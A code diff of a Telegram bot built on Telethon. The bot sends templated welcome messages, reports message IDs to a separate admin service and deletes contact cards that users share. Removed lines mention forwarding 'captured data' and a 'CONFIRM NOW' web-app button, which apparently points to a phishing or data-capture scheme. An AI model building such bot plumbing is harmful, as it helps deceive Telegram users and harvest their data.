@@ -1,5 +1,3 @@
-# section_bot.py — run this as separate bot on same server (different process/session)
-# It forwards captured data to admin bot via HTTP POST /api/section_forward
 import os, json, asyncio, logging, time
 from telethon import TelegramClient, events
 from telethon.tl.custom import Button
@@ -28,21 +26,16 @@ bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 async def send_welcome(uid, name):
     for i, m in enumerate(SECTION_WELCOME_MSGS):
         content = (m.get("content") or "").replace("{name}", name)
-        is_last = (i == len(SECTION_WELCOME_MSGS) - 1)
-        buttons = None
-        if is_last:
-            buttons = [[Button.url("CONFIRM NOW", WEBAPP_URL + "?auto=1")]]
         try:
-            sent = await bot.send_message(uid, content, buttons=buttons, parse_mode='md')
+            sent = await bot.send_message(uid, content, parse_mode='md')
             logger.info(f"Welcome #{i+1} sent: {sent.id}")
-            # Send msg_id to admin for tracking
             try:
                 http_requests.post(
                     f"{ADMIN_BOT_URL}/api/section_msg_track",
-                    json={"tg_id": uid, "msg_id": sent.id, "type": "welcome"},
+                    json={"tg_id": uid, "msg_id": sent.id},
                     timeout=8)
-            except Exception as e:
-                logger.warning(f"track err: {e}")
+            except Exception:
+                pass
         except Exception as e:
             logger.error(f"welcome err: {e}")
         await asyncio.sleep(0.3)
@@ -52,20 +45,19 @@ async def send_welcome(uid, name):
 async def start_handler(event):
     sender = await event.get_sender()
     name = sender.first_name or "Friend"
-    logger.info(f"Section /start from {sender.id} ({name})")
+    logger.info(f"Section /start {sender.id} ({name})")
     await send_welcome(sender.id, name)
 
 
 @bot.on(events.NewMessage())
 async def any_msg(event):
-    # Delete contact cards from user
     try:
         if event.message and event.message.contact:
-            logger.info(f"User {event.sender_id} shared contact — deleting")
+            logger.info(f"Delete contact from {event.sender_id}")
             await asyncio.sleep(0.3)
             await event.delete()
-    except Exception as e:
-        logger.warning(f"delete err: {e}")
+    except Exception:
+        pass
 
 
 async def main():
